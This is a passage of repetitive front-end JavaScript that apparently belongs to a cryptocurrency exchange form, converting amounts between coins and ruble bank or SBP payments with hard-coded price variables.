                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_ZEC )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_BNB )  ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value / PRICE_XMR )  ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Dai (DAI)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_DAI ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_DOT ).toFixed(2);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_SOL ).toFixed(3);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_POL ) / 2 ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_ETH ).toFixed(6);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DAI ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_DOT ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_SOL ).toFixed(3);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_ETH ).toFixed(6);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOT ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Solana (SOL)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_SOL ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_ETH ).toFixed(6);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_SOL ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Polygon (POL)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_POL ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( ( document.querySelector('.first__input-two').value * PRICE_POL ) /  PRICE_BTC ) ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_SOL ).toFixed(2);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_ETH ).toFixed(6);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_POL ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_ETH ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETH ) / PRICE_XMR ).toFixed(2);
                    }
                } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_ARB ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ARB ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_LTC ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
